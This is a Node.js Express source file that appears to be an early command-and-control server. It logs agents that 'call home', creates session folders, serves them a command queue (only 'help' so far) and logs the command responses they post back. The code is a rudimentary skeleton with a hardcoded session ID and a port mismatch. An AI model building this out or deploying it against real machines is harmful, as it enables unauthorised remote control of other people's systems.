const express = require('express')
const app = express()
const bodyParser = require('body-parser');
const fs = require('fs');

//Database Dir
var database = "C:\\Users\\0zm0s1z\\Projects\\Prismatica\\src\\database";

function newSession() {
    console.log("XXX Called Home!");

    //Assign New Session Identifier
    console.log("Session Established!");
    var sid = "1337";
    instantiateSession(sid);
}

function instantiateSession(sid) {
    console.log("Buidling Session Data Structure");
    var sessionLog = "\\log\\session";
    var dir = database + sessionLog + "\\" + sid;
    console.log(dir + "\\sessioninfo.json");
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir);
      //Create Session Info File
      fs.writeFile(dir + "\\sessioninfo.json", JSON.stringify([{sid: sid, "RHOST":"127.0.0.1"}]), function(err) {
        if(err) {
            return console.log(err);
        }
      });
      //Create Command Queue
      fs.writeFile(dir + "\\commandqueue.json", JSON.stringify([{cid: "1", cmd:"help"}]), function(err) {
        if(err) {
            return console.log(err);
        }
      });
      //Create Response database
      fs.writeFile(dir + "\\response.json", "", function(err) {
        if(err) {
            return console.log(err);
        }
      });
      //Create Session log
      fs.writeFile(dir + "\\sessionlog.json", "", function(err) {
        if(err) {
            return console.log(err);
        }
      });
    }
}

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/test.html', function (req, res) {
  var sid = "1337";
  //Get CMD to Exec
  var cmdqueue = database + "\\log\\session\\" +  sid + "\\commandqueue.json";
  fs.readFile(cmdqueue, 'utf8', function (err,data) {
    if (err) {
      return console.log(err);
    }
    console.log(data);
    res.send(data);
  });
  //res.send('[ {"CMD": "help"} ]')
  //res.sendfile("index.html");

  //If new agent establish session
  newSession();
})

app.post('/ctrl',function(req){
  var res = req.body.resp;
  //console.log(req.body);
  console.log("Command Response: " + res);
  //res.end("yes");
});



app.listen(8000, function () {
  console.log('Example app listening on port 3000!')
})
